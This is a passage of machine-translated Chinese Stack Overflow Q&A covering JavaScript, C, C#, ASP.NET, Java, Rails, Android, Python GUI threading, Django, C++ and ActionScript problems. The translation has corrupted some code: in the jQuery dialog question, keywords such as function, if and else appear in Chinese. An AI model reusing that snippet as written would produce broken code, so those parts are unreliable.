    this.setName = function(name) {
        _name = name
    }
    this.getName = function() {
        return _name
    }
}

function GreetingPerson() {
    Person.call(this);
    this.sayHello = function() {
        console.log(this.getName() + ': "Hello!"');
    }
}

// taken from Eloquent Javascript
function clone(object) {
    function OneShotConstructor() {}
    OneShotConstructor.prototype = object;
    return new OneShotConstructor();
}

GreetingPerson.prototype = clone(Person.prototype);
GreetingPerson.prototype.contructor = GreetingPerson;

var manuel = new GreetingPerson()
manuel.setName('Manuel');
manuel.sayHello();

var world = new GreetingPerson()
world.setName('World');
world.sayHello();
manuel.sayHello();
console.log(manuel.name)​;​ 
```

# c - 阻止进程执行某些系统调用

> ID：13343058
> 
> 赞同：11
> 
> 时间：2012-11-12T11:40:14.523
> 
> 标签：c, linux, security, system-calls

我正在编写一个产生子进程的程序。出于安全原因，我想限制这些进程可以做什么。我知道来自程序外部的安全措施，例如`chroot`or `ulimit`，但我想做更多的事情。我想限制子进程完成的系统调用（例如防止调用`open()`，`fork()`等等）。有没有办法做到这一点？最理想的情况是，被阻塞的系统调用应该返回一个错误，但如果这是不可能的，那么终止进程也是好的。

我想它可以做到，但从`ptrace()`手册页我真的不明白如何使用它来达到这个目的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T12:07:04.010

听起来[SECCOMP_FILTER](http://lxr.linux.no/#linux+v3.6/Documentation/prctl/seccomp_filter.txt)是在内核版本 3.5 中添加的，是您所追求的。该[`libseccomp`库](http://lwn.net/Articles/494252/)为此功能提供了一个易于使用的 API。

顺便说一句，`chroot()`这`setrlimit()`两个系统调用都可以在您的程序中调用 - 除了 seccomp 过滤之外，您可能还想使用其中一个或两个。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-12T19:06:31.827

如果你想这样做`ptrace`，你有一些选择（有些非常简单）。首先，我建议您按照[此处解释](http://www.linuxjournal.com/article/6100?page=0,0)的教程进行操作。有了它，您可以了解如何知道正在调用哪些系统调用，以及基本`ptrace`知识（不用担心，这是一个非常简短的教程）。您拥有的选项（我知道）如下：

*   最简单的方法是杀死孩子，这就是[这里的确切代码](https://stackoverflow.com/questions/12015141/cancel-a-system-call-with-ptrace)。
*   其次，您可以让孩子失败，只需使用 更改寄存器`PTRACE_SETREGS`，将错误的值放入其中，并且您还可以根据需要更改系统调用的返回值（再次，使用`PTRACE_SETREGS`）。
*   最后你可以跳过系统调用。但为此，您应该知道系统调用调用后的地址，将指令寄存器指向那里并设置它（再次，用`PTRACE_SETREGS`）。

# javascript - 如何将对话框定位到窗口的中心

> ID：13343063
> 
> 赞同：1
> 
> 时间：2012-11-12T11:40:26.013
> 
> 标签：javascript, css, jquery-ui

谁能告诉我如何使用 JQuery 将框定位到窗口的中心。我将粘贴下面的代码：-

```

    $("#address_book").click(函数 (e)
      {
          …………

         显示对话框（假）；
         e.preventDefault();
        ...........
      });

    函数显示对话框（模态）{

    ……  
      $("#overlay").show();

      $("#dialog").fadeIn(300);

      如果（模态）
      {

         $("#overlay").unbind("点击");
      }
      别的
      {
         $("#overlay").click(函数 (e)
         {
            隐藏对话（）；
         });
      }
     }

```

我希望对话框位于窗口的中心。谁能告诉我该怎么做

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T11:53:47.150

下面的代码不是 jquery，而是纯 javascript，所以它可以在没有任何问题的情况下工作

```
 var dialog = document.getElementById('dialog')
  dialog.style.top = ((window.innerHeight/2) - (dialog.offsetHeight/2))+'px';
  dialog.style.left = ((window.innerWidth/2) - (dialog.offsetWidth/2))+'px'; 
```

使用 jquery 的相同代码

```
 $('#dialog').css({
      top: ((window.innerHeight/2) - ($('#dialog').height()/2))+'px',
      left:((window.innerWidth/2) - ($('#dialog').width()/2))+'px'
    }); 
```

代码的Demo，在不同的应用 [Demo](http://jsbin.com/ihepel/16/edit)

**注意：你的#dialog 应该有，`position:absolute`在它的css中，为了定位那个 div**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T11:56:31.547

只要您在打开它们之前将所有内容放入其中，jQueryUI 对话框就会自动居中。

但是，它们将始终相对于浏览器窗口居中，而不是任何父“容器”元素，因为 jQueryUI 会从 DOM 中删除转换为对话框的元素并将其重新附加到`document.body`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T11:57:26.110

在 jQuery 中试试这个：

```
$("#dialog").css("margin-top", ($(document.height() - $(this).height())/2);
$("#dialog").css("margin-left", ($(document.width() - $(this).width())/2); 
```

这应该有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-05-27T08:17:11.363

$('#mycustomdialogDiv').css({ top: 100, left:100 });

有时，此代码不适用于 jquery，因为 jquery 对话框会在您的 customdialogdiv 元素上生成自己的包装器。为了实现它，请使用以下代码；$('#mycustomdialogDiv').parent('div').css({ top: 100, left:100 });

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-03-15T03:42:22.317

如果您知道对话框的高度和宽度，您可以设置：

```
top: 50%;
left: 50%;
margin-top: -[HEIGHT/2]px;
margin-left: -[WIDTH/2]px; 
```

这样做的好处是，如果调整寡妇的大小，它无论如何都会在中心。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-12-19T13:03:33.427

最好用css和transform来做，因为..

1.  不同的浏览器已经将对话框置于中间，但即便如此，方式也不同！
2.  您只能使用变换重新计算自己的宽度定位（不能使用边距等）

```
dialog {
    position: absolute;
    left: 50vw;
    top: 50vw;
    transform: translate(-50%, -50%);
    margin: 0; /*reset some browser centering*/
} 
```

如果由于某种原因你真的需要 jquery，只需使用上面的 css 添加一个带有 jQ​​uery 的类

# c# - 如何使用 Validate() 将当前日期添加到 sql 数据库

> ID：13343067
> 
> 赞同：1
> 
> 时间：2012-11-12T11:40:33.260
> 
> 标签：c#, sql, database

我有 C# 程序，它从文本框获取值并使用`validate()`BindingNavigator 中的保存按钮上的方法将其添加到 sql 数据库

```
 private void tableBindingNavigatorSaveItem_Click(object sender, EventArgs e)
    {           
        this.Validate();
        this.tableTiryaqBindingSource.EndEdit();
        this.tableAdapterManager.UpdateAll(this.tiryaqDataSet);           
    } 
```

但我需要添加当前`date`到日期列而不从`DateTimePicker`. 日期列不允许`null`，我试过这段代码

```
 private void tableBindingNavigatorSaveItem_Click(object sender, EventArgs e)
    {           
        this.Validate();

        SqlCommand cmd = new SqlCommand("INSERT INTO Table(date) VALUES(@date)", con);
        con.Open();
        cmd.Parameters.AddWithValue("@date", DateTime.Now);
        cmd.ExecuteNonQuery();
        con.Close();

        this.tableTiryaqBindingSource.EndEdit();
        this.tableAdapterManager.UpdateAll(this.tiryaqDataSet);           
    } 
```

但它在日期列上给了我空异常！所以有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T11:43:26.193

如果您有权限，则可以`GetDate()`在列中添加为默认值。它会自动将当前日期放在日期列中

编辑：

您现在不需要从代码中发送日期，数据库服务器将在插入时在日期列中插入当前日期。如果您无法更改参数列表并且必须发送它，那么您可以将其发送为 null 并声明您的参数`@date datetime = NULL`

```
 SqlCommand cmd1 = new SqlCommand("SqlCommand("INSERT INTO Table(date) VALUES('" + DateTime.Now.ToString("yyyy/MM/dd") + "')", con); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T17:19:24.890

在解决方案资源管理器中按`Dataset`然后打开旁边的箭头`Dataset.Desiner.cs`。搜索您想要的列（这里是`DATE`）并找到该`Default Value`行。在这里你可以把你的代码像这样

`private static System.DateTime columndate_defaultValue = System.DateTime.Now;`

你会发现这一行没有`defaultValue = System.DateTime.Now;`然后你添加它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T11:44:05.363

更改数据库表本身并将 GETDATE() 定义为日期列的默认值

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T11:45:43.023

您还可以指定参数的类型：

```
SqlParameter parameter = cmd.Parameters.Add("@date", System.Data.SqlDbType.DateTime);
parameter.Value = DateTime.Now;
cmd.ExecuteNonQuery(); 
```

# c#-4.0 - ASP.NET MVC 4 cookie 消失

> ID：13343073
> 
> 赞同：3
> 
> 时间：2012-11-12T11:41:07.870
> 
> 标签：c#-4.0, cookies, asp.net-mvc-4, request-pipeline

我有一个 ASP.NET 应用程序，它将身份验证 cookie 发送到 ASP.NET MVC 应用程序，用作后台应用程序。

我添加了一个全局过滤器，用于检查身份验证 cookie 的每个控制器操作。如果 cookie 存在，它允许用户进入页面。

代码如下所示：

```
 public class SecurityFilter : FilterAttribute, IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            // TODO: For some reason .AUTHCookie cookie isn't exist in request context of filter,

                           HttpCookie cookie = filterContext.RequestContext.HttpContext.Request.Cookies[".AUTHCookie "];

            if (cookie != null)                 { 
```

另一方面，我可以`Application_BeginRequest`在 Global.asax 文件中看到从 ASP.NET 应用程序发送的 cookie。

cookie 在哪里以及为什么消失了？cookie 在 MVC 请求处理管道的哪个部分被丢弃？

```
 protected void Application_BeginRequest(object sender, EventArgs e)
        {
            var cookies = HttpContext.Current.Request.Cookies;
            // HERE I CAN SEE BOTH cookies. In filter action only one cookie was found. The authentication cookie is thrown somewhere ...
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-27T03:34:20.650

我找到了适合我的场景的解决方案。我已经在两个应用程序的机器键中添加了 compatibilityMode="Framework45" ，并且一切正常。

注意：如果您的应用程序之一使用的是旧版本的 .NET 框架，您必须明确配置您的 .NET 4.5 应用程序以使用较早的机器兼容模式，否则它们将无法加密/解密表单身份验证票证。

只是为了提醒你我的场景：

```
WebForms ASP.NET 4.5

<machineKey compatibilityMode="Framework45" decryption="AES" validation="SHA1" decryptionKey="your_key1" validationKey="your_keu2" />
  <authentication mode="Forms">
    <forms name="_authcookie" domain=".domain.com" loginUrl="Default.aspx?View=1" defaultUrl="Default.aspx?View=1" timeout="30" path="/" protection="All" slidingExpiration="true" enableCrossAppRedirects="true" />
  </authentication>

MVC 4
<machineKey compatibilityMode="Framework45" decryption="AES" validation="SHA1" decryptionKey="your_key1" validationKey="your_keu2" />
   <authentication mode="Forms">
     <forms name="_authcookie" domain=".domain.com" defaultUrl="~/" timeout="30" path="/" protection="All" slidingExpiration="true" enableCrossAppRedirects="true" />
    </authentication> 
```

兼容模式的可能值：

[http://msdn.microsoft.com/en-us/library/system.web.configuration.machinekeysection.compatibilitymode.aspx](http://msdn.microsoft.com/en-us/library/system.web.configuration.machinekeysection.compatibilitymode.aspx)

# java - 有什么方法可以使用另一台计算机上的 exe4j 运行由 jar 制作的 exe？

> ID：13343077
> 
> 赞同：3
> 
> 时间：2012-11-12T11:41:19.267
> 
> 标签：java, exe4j

我制作了一个小 GUI 程序来输入内容，然后将“javamail”发送到我的电子邮件。我必须从 javamail-1.4.5 导入许多 jar 库，然后将其构建（shift + f11）到 jar，然后使用 exe4j 使其成为 exe（还添加 /dist/lib 中库中的所有 jar）和从 1.5 到 1.7 的 jre 版本（我使用 1.7 来制作这个应用程序）。它在我的计算机上运行顺利，但是当我将 exe 提供给其他计算机时。它说：

“**在您的系统上找不到 JVM。请定义 EXE4J_JAVA_HOME 以指向已安装的 32 位 JDK 或 JRE，或者从 www.java.com 下载 JRE** ”

我认为他们必须安装 JDK 才能运行该应用程序。但是对于很多不了解计算的朋友来说，可能会感到困惑。无论如何，他们可以在不要求他们安装 JDK 的情况下使用该 send-javamail-app 吗？

提前感谢，对不起我的英语！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-12-10T21:09:14.743

这很简单。

在您完成设置名称、图标等基本步骤后，在第 6 步中，JRE 就是奇迹发生的地方：

1.  单击高级选项并选择搜索序列

![在此处输入图像描述](../Images/aacebac9b96fd95a4db5b09eb88c657e.png)

2.  点击添加新项目+并选择目录

![在此处输入图像描述](../Images/10ccded6024f8c2e3deb20f11dc4aaaa.png)

3.  选择你的jre目录，它必须是相对路径

![在此处输入图像描述](../Images/23f5bd2363087bf539655cfe5f496324.png)

4.  将您的新项目放在列表中的第一个位置 ![在此处输入图像描述](../Images/427c0f97bec6dcb13fc91050104f09cd.png)

之后你要做的就是将你的 exe 和 jre 目录一起发布，为此我通常使用[Inno Setup Compiler](http://www.jrsoftware.org/)创建一个安装程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T11:53:29.333

您可以将 JRE 与您的产品捆绑在一起，这是您可以在不打扰您的伙伴的情况下实现的最佳方式。您的应用程序的大小将增加。

运行任何 Java 应用程序都需要 JRE。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:14:13.623

也许我的个人项目 Java Customization Builder 可以帮助你，它分析你的程序使用的类，并从 jar 中精简这些类，它还分析你的程序使用的 jvm 文件。然后它会生成一个可执行文件并打包 jre 运行时和您的程序。

JCB项目介绍：

Java Customization Builder 是一个自定义您的 java 应用程序和 JRE 的工具。

它是一个 java 应用程序构建工具，使您能够生成一个非常小的 java 归档包，其中包含一个精简的 jre。对于swing应用，归档小于5M，对于SWT应用，归档通常小于3M。并且定制的java应用程序可以在不安装JRE的Windows上运行，并由可执行文件加载。

JCB项目页面：http: [//jcb.sourceforge.net](http://jcb.sourceforge.net)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T12:07:00.477

Java 运行时环境 (JRE) 是运行 Java 应用程序所必需的。为了在没有安装 Java 的计算机上安装 JRE，您必须将其捆绑（将其放入您的应用程序中），或让您的朋友下载 JRE。
我不确切知道如何捆绑 JRE，但是[将 JRE 与 Java 应用程序捆绑在一起](https://stackoverflow.com/questions/1357153/bundling-the-jre-with-a-java-application)的问题可能会有所帮助。

# ruby-on-rails - Capistrano 抛出：请安装 mysql2 适配器

> ID：13343081
> 
> 赞同：1
> 
> 时间：2012-11-12T11:41:36.293
> 
> 标签：ruby-on-rails, capistrano

我使用 Capistrano 部署使用`mysql2`适配器的 Rails 3.2.1 应用程序。

该应用程序在 Windows 上本地运行良好，但是当我尝试部署到 linux 服务器时，Capistrano 抛出以下错误：

```
Please install the mysql2 adapter: gem install activerecord-mysql2-adapter (mysql2 is not part of the bundle. Add it to Gemfile.) 
```

请注意，我正在 GIT 上跟踪 Gemfile.lock 但我注意到了这一点：

```
...
mysql2 (0.3.11-x86-mingw32)
... 
```

锁定文件锁定了版本，这很好，但我认为它锁定了 Windows 版本（x86-mingw32），这可能无法在 linux 上运行。

有人有同样的问题吗？我不想取消跟踪 Gemfile.lock 因为不推荐。

我`deploy.rb`的就像：

```
require "bundler/capistrano"
load "deploy/assets"

... configuration here ... 
```

*PS我还注意到其他宝石被这部分“x86-mingw32”锁定，比如`bcrypt-ruby`*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T22:49:03.500

不要担心 Gemfile.lock 中有任何带有“mingw32”的 gem。看看你的 Gemfile。你有以下行吗？

```
gem 'mysql2' 
```

鉴于此，您是否`bundle install`在 linux 服务器上运行（或者您是否将此功能添加到您的 capistrano 配方中？）

顺便说一句，如果您有任何特定于 Windows 的 gem，并且您想确保它们仅在此上下文中加载，请使用以下条件：

```
platforms :mswin, :mingw do
  # placeholder for gems in a windows environment
end 
```

# android - 错误：您必须为 TextView 提供资源 ID

> ID：13343082
> 
> 赞同：1
> 
> 时间：2012-11-12T11:41:38.413
> 
> 标签：android

我有一个列表，用（`course id- course name`）检索我的 sql 表单。

我对列表使用哈希，我创建了一个适配器，它给了我列表并将它设置为微调器。但是 log cat 中有一个问题，它说：

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T11:45:07.457

如果您检查[http://developer.android.com/reference/android/widget/ArrayAdapter.html#ArrayAdapter(android.content.Context](http://developer.android.com/reference/android/widget/ArrayAdapter.html#ArrayAdapter(android.content.Context) , int, T[])，您会发现数组适配器期望第二个参数是文本视图**而不是布局**的资源 id ..

使用以下方法初始化您的适配器：

```
new ArrayAdapter(MainActivity.this, android.R.layout.simple_spinner_item, coursesList); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T11:51:39.530

以及 Luksprog 的解释：

ArrayAdapter 要求资源 ID 是 TextView XML 异常，这意味着您不提供 ArrayAdapter 期望的内容。当您使用此构造函数时：

```
new ArrayAdapter<String>(this, R.layout.a_layout_file, this.file) 
```

**R.Layout.a_layout_file**必须是 xml 布局**，其中第一个元素必须是 TextView**，如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<TextView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" 
    //other attributes 
/> 
```

如果你想让你的列表行布局有点不同，那么一个简单的 TextView 元素使用这个构造函数：

```
new ArrayAdapter<String>(this, R.layout.a_layout_file, 
   R.id.the_id_of_a_textview_from_the_layout, this.file) 
```

您在其中提供可以包含各种视图的布局的**id**，但还必须包含 TextView 和您传递给 ArrayAdapter 的 id（第三个参数），以便它可以知道将字符串放在哪里

# android - 如何将数据发送到安装在不同手机上的我的应用程序而不会出现在收件箱中

> ID：13343085
> 
> 赞同：1
> 
> 时间：2012-11-12T11:41:47.993
> 
> 标签：android, sms

我正在写一个约会应用程序。我希望我的应用能够将约会数据从一部手机发送到另一部手机上的同一个应用。该应用程序将读取数据并将约会添加到列表中。我不希望用户能够阅读 SMS 本身。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:17:51.693

不要使用短信，它通常会花钱，如果权限列表显示“SEND_SMS”，人们不会使用您的预约申请。还有很多其他协议，最简单的是http，它允许您通过网络发送数据并存储到服务器，然后在需要时另一个设备可以检索它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:38:48.370

定义一种格式，以便您可以识别您的 SMS 并区分它们和常规消息。您可以通过编程方式发送 SMS，这里没有问题（我几乎可以肯定该消息不会显示在发件箱中）。

在您的应用程序中，注册一个 SMS 侦听器，以便您首先扫描传入的 SMS。如果邮件与您的格式匹配，请对其进行处理并将其从收件箱中删除。这部分很棘手，因为没有 API 可以做到这一点。检查这个问题：[如何以编程方式从 Android 的收件箱中删除短信？](https://stackoverflow.com/q/419184/813951)

也就是说，SMS 非常不可靠，负载非常小，在用户不知情的情况下使用它是不好的做法。您可以设置一个邮件服务器并为每个用户提供一个邮件帐户，并使用 JavaMail 在幕后发送/接收。这也将使用户能够通过 PC 中的外部客户端接收消息。或者您可以将消息发送到 WS，将其存储在数据库中，并让应用程序定期拉取新消息。甚至使用 GCM，这是一种推送方法（[http://developer.android.com/training/cloudsync/gcm.html](http://developer.android.com/training/cloudsync/gcm.html)）。

# javascript - 使用 Fancybox 突出显示 Div

> ID：13343087
> 
> 赞同：0
> 
> 时间：2012-11-12T11:41:52.477
> 
> 标签：javascript, jquery, html, fancybox

我想突出显示一个 div，它是使用 fancybox 的表单的一部分。

```
<form>
  ...
  ...
  <div id='sub-form'>
    ...
    ...
  </div>
  ...
  ...
<form> 
```

我想`id = sub-form`在弹出窗口和主页中显示 div。当弹出窗口中元素的值发生更改时，父窗口中该元素的值应相应更改。

同时，我想突出显示该 div。

我使用fancybox 进行了尝试，但fancybox 正在将其从表单中删除，并且还隐藏在父窗口中。

可以用fancybox做吗？或者任何插件可用于执行此任务？谢谢！

# python - 多线程GUI编程需求说明

> ID：13343096
> 
> 赞同：9
> 
> 时间：2012-11-12T11:42:34.703
> 
> 标签：python, user-interface

我正在寻找一个很好的解释，说明在图形应用程序中使用多线程的必要性。在下面的示例中使用了 Python，但问题不是 Python 特定的，它可能适用于任何语言的图形编程的一般设计。

让我们举一个简单的例子。让我们假设有一个应用程序对一组文件执行某种耗时的操作，并将它的进度输出到控制台。让我们假设这个操作每个文件需要 2 秒，并且有 10 个文件需要处理，分别称为 1.txt、2.txt、3.txt、... 10.txt。然后一个示例实现可能如下所示：

**安慰**

```
import time
def process(file):
    print 'processing {0}...'.format(file)
    time.sleep(2.0) #simulate slow operation

files = ['{0}.txt'.format(i) for i in range(1, 11)]
map(process, files) 
```

控制台示例当然是单线程的，并且可以很好地完成工作。现在，如果我们想添加图形进度条，单线程实现可能如下所示：

**单线程图形界面**

```
import time, gtk, gobject

def process(file):
    print 'processing {0}...'.format(file)
    time.sleep(2.0)

class MainWindow(gtk.Window):
    def __init__(self):
        super(MainWindow, self).__init__()
        self.progress = gtk.ProgressBar()
        self.progress.set_fraction(0)
        self.add(self.progress)
        self.connect("destroy", gtk.main_quit)
        self.show_all()
        files = ['{0}.txt'.format(i) for i in range(1, 11)]
        gobject.timeout_add(100, self.submit, files, 0)

    def submit(self, files, i):
        process(files[i])
        self.progress.set_fraction((i + 1.0)/len(files))
        if i + 1 < len(files):
            gobject.idle_add(self.submit, files, i + 1)

win = MainWindow()
gtk.main() 
```

这似乎工作正常，但是当您运行应用程序时，如果您尝试与应用程序交互（例如尝试调整窗口大小），它将卡住，并且只有在被释放以处理挂起的 gui 事件时每两秒响应一次。最后一个示例是多线程实现，并在整个执行过程中保持响应。

**多线程图形用户界面**

```
import time, gtk, gobject, threading

def process(file):
    print 'processing {0}...'.format(file)
    time.sleep(2.0)

class MainWindow(gtk.Window):
    def __init__(self):
        super(MainWindow, self).__init__()
        self.progress = gtk.ProgressBar()
        self.progress.set_fraction(0)
        self.add(self.progress)
        self.connect("destroy", gtk.main_quit)
        self.show_all()
        files = ['{0}.txt'.format(i) for i in range(1, 11)]
        threading.Thread(target=self.submit, args=(files,)).start()

    def submit(self, files):
        for i, file in enumerate(files):
            process(file)
            gobject.idle_add(self.progress.set_fraction, (i + 1.0)/len(files))
            if not self.get_visible():
                return

gtk.gdk.threads_init()
win = MainWindow()
gtk.main() 
```

对我来说，如果你的代码中有一个长时间运行的阻塞操作，并且你想要一个响应式的 gui，你必须使用多线程解决方案，这对我来说似乎非常清楚和合乎逻辑。没有其他方法可以解决它。是这样吗？我曾多次尝试向其他开发人员解释这一点，但许多人不理解或不同意。有人可以提供对这个概念的解释，关于它的文章的链接，或者如果我的理解不正确，请纠正我。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T11:50:14.883

你的理解是正确的。如果应用程序不是多线程的，则应用程序会等待每个操作完成。当您的应用程序是多线程的时，您使用一个线程来处理 GUI 操作，而另一个线程来处理文件。

我没有文章或类似内容的参考。如果您将线程视为人，可能会有所帮助，每个人都有自己的工作并且每个人一次只能做一件事。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T12:13:52.313

主要原因是，GUI 工具包处理所有事件（鼠标移动、按钮单击、键盘输入、系统事件等）`mainloop`，这不是您为 GUI 应用程序编写的代码的一部分。

此主循环调用您提供的所有事件处理程序和其他函数。现在，如果其中一个函数花费的时间太长（例如 > 100 毫秒），则会对 UI 响应性产生非常明显的影响，因为主循环将无法处理更多事件。

无论使用哪种工具包的编程语言，都应该在任何有关 GUI 编程的书籍的“高级概念”部分中详细讨论这个主题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T11:56:04.490

多线程是解决这个问题的一种方法，但不一定是唯一（或最好）的方法。作为一个 python 示例，[greenlets](http://greenlet.readthedocs.org/en/latest/)提供了一种在同一线程中运行并发进程的方法，避免了与多线程相关的锁定问题。在大多数情况下，我当然会认为 greenlets 是首选解决方案，因为它们相对容易编码。

# django - Django NoReverseMatch 5

> ID：13343098
> 
> 赞同：1
> 
> 时间：2012-11-12T11:42:37.903
> 
> 标签：django, reverse

我收到此错误，我不知道为什么：

```
 Reverse for 'buildings.views.generate' with arguments '()' and keyword arguments '{'new_id': -1}' not found. 
```

这是我的 urls.py 的（一部分）：

```
 url(r'^buildings/generate/new_building(?P<new_id>\d+)', 'buildings.views.generate'), 
```

风景：

```
 @login_required
  def generate(request, new_id):
          session = {}

          if new_id == -1:
                  other_buildings = Building.objects.filter(utente=request.user, pronto=False)

                  if other_buildings.length > MAX_TEMPORARY_BUILDINGS:
                          return redirect('buildings.views.index')
                  else:
                          building = Building(utente=request.user, pronto=False)
                          building.save()
                          return redirect('buildings.views.generate', building_id=building)

          elif new_id >=0:

                  building = Building.objects.filter(pk=new_id)

                  if building.utente != request.user:
                          raise Http404
                  elif building.pronto:
                          return redirect('buildings.views.detail', building_id=new_id)
                  elif building.nome == None:
                          buildings= Building.objects.filter(pronto=True).order_by('utente')
                          session['buildings'] = buildings

                  session['building'] = building                        
          else:
                  raise Http404

          return render_to_response('buildings/generate/generate-index.html', session, context_instance = RequestContext(request)) 
```

这里是模板“base.html”中产生错误的代码：

```
 <li><a href="{% url buildings.views.generate new_id=-1 %}">New Building</a></li> 
```

我看不到任何错误，请帮助我。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T11:47:03.327

大概这适用于正数。

`-1`不符合以下规范`new_id`：

```
(?P<new_id>\d+) 
```

你需要确保你也匹配`-`。我认为这应该有效（未经测试）：

```
(?P<new_id>-?\d+) 
```

# iphone - 自定义单元格子层和 UITableViewCell 选择

> ID：13343099
> 
> 赞同：0
> 
> 时间：2012-11-12T11:42:50.860
> 
> 标签：iphone, objective-c, uitableview, uikit, cagradientlayer

如何在`UITableViewCell`消失中制作自定义子图层`setSelected:animated:`？

**语境：**

我`UITableViewCell`通过添加`CAGradientLayer`inside 为我添加了一个自定义背景层`drawRect:`，如下所示：

```
- (void)drawRect:(CGRect)rect{
    [super drawRect:rect];

    [[self providerLabel] setTextColor:kOUBlue];
    [self addGrayLayer];
}

- (void)addGrayLayer{
    [[[self contentView] layer] insertSublayer:[self grayGradientLayer] atIndex:0];
}

- (CAGradientLayer *) grayGradientLayer{
  if (!_grayGradientLayer) {
    CAGradientLayer *gradient = [CAGradientLayer layer];

    UIColor *white = [UIColor colorWithWhite:1 alpha:2];
    UIColor *gray = [UIColor colorWithRed:0.96 green:0.96 blue:0.96 alpha:1];

    [gradient setColors:@[(id)white.CGColor, (id)gray.CGColor]];
    [gradient setFrame:[self bounds]];

    _grayGradientLayer = gradient;

  }

  return _grayGradientLayer;
} 
```

当用户点击单元格时，不会出现蓝色突出显示。所以我试图`CAGradientLayer`像`setSelected:animated:`这样隐藏：

```
- (void)setSelected:(BOOL)selected animated:(BOOL)animated
{
  [super setSelected:selected animated:animated];

  // Configure the view for the selected state

  if (selected) {
    [[self grayGradientLayer] setHidden:YES];
  }else{
    [[self grayGradientLayer] setHidden:NO];
  }

  [[self contentView] setNeedsDisplay];
} 
```

蓝色背景出现，但直到推送动画开始。有什么方法可以让默认的蓝色立即出现？我还尝试添加第二种颜色`CAGradientLayer`并手动交换它们，但在我看来，在我将图层隐藏在`setSelected:`.

我试图强制单元格重新绘制，`setNeedsDisplay`但没有成功。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T20:47:35.027

在挖掘之后，我[发现了这个问题](https://stackoverflow.com/questions/899862/uitableviewcell-how-to-prevent-blue-selection-background-w-o-borking-isselected?rq=1)，我意识到我使用了错误的方法。事实证明我必须使用该`setHighlighted:animated:`方法。

我的新代码如下所示：

```
- (void)setHighlighted:(BOOL)highlighted animated:(BOOL)animated{

   [super setHighlighted:highlighted animated:animated];

   if (highlighted) {
     [[self grayGradientLayer] setHidden:YES];
   }else{
     [[self grayGradientLayer] setHidden:NO];
   }
} 
```

# c++ - 未找到来自基类模板的成员

> ID：13343102
> 
> 赞同：6
> 
> 时间：2012-11-12T11:43:00.740
> 
> 标签：c++, templates

> **可能重复：**
> [为什么我必须通过 this 指针访问模板基类成员？](https://stackoverflow.com/questions/4643074/why-do-i-have-to-access-template-base-class-members-through-the-this-pointer)

我有一个类层次结构，如下所示：

```
template<typename T>
class Base {
protected:
    T t;
};

template<typename T>
class Derived: public Base<T> {
public:
    T get() { return t; }
};

int main() {
    Derived<int> d;
    d.get();
} 
```

问题是[在基类中找不到受保护的成员变量 t](http://ideone.com/GraWLC)。编译器输出：

```
prog.cpp: In member function 'T Derived<T>::get()':
prog.cpp:10:22: error: 't' was not declared in this scope 
```

那是正确的编译器行为还是只是编译器错误？如果是正确的，为什么会这样？最好的解决方法是什么？

使用完全限定名称有效，但它似乎不必要地冗长：

```
T get() { return Base<T>::t; } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T11:44:20.320

要使用模板基类中的成员，您必须使用 . 作为前缀`this->`。

```
template<typename T>
class Derived: public Base<T> {
public:
    T get() { return this->t; }
}; 
```

# events - 在触发其他操作时模拟 html 列表框下拉列表

> ID：13343106
> 
> 赞同：1
> 
> 时间：2012-11-12T11:43:13.163
> 
> 标签：events, drop-down-menu, listbox, simulate, dispatch

请有人帮助我解决以下问题。

我有一个列表下拉框，可以在触发 img div 时打开它。

这在 chrome 中完美运行，而在所有其他浏览器（如 firefox、ie 和其他浏览器）中却不适用。我准备好了一个小提琴链接，它显示了 chrome 的工作示例。

[链接] [http://jsfiddle.net/jNVwF/](http://jsfiddle.net/jNVwF/)

希望听到任何堆栈用户的消息。

# 通过参考 - 类似的堆栈

[Firefox 5 dispatchEvent 不工作](https://stackoverflow.com/questions/6474893/firefox-5-dispatchevent-not-working) （不工作，已实施）

我在小提琴链接上做错了什么？

再次感谢。萨杰。

# actionscript-3 - 我的记忆游戏 AS3 出现错误 #2025

> ID：13343116
> 
> 赞同：0
> 
> 时间：2012-11-12T11:43:32.963
> 
> 标签：actionscript-3, error-handling

我一直忙于创建一个记忆游戏（卡片匹配），但我遇到了一个错误，我必须在星期三之前解决它，因为它是我学校的一个项目。

我尝试了很多方法来尝试解决这个问题，但由于这是我编写的第一个 AS3 脚本，我不知道如何解决它。

当我匹配 1 对牌并且计时器超时或您获胜时，会发生错误。

详细错误报告：

> ArgumentError：错误 #2025：提供的 DisplayObject 必须是调用者的子对象。

```
at flash.display::DisplayObjectContainer/removeChild()
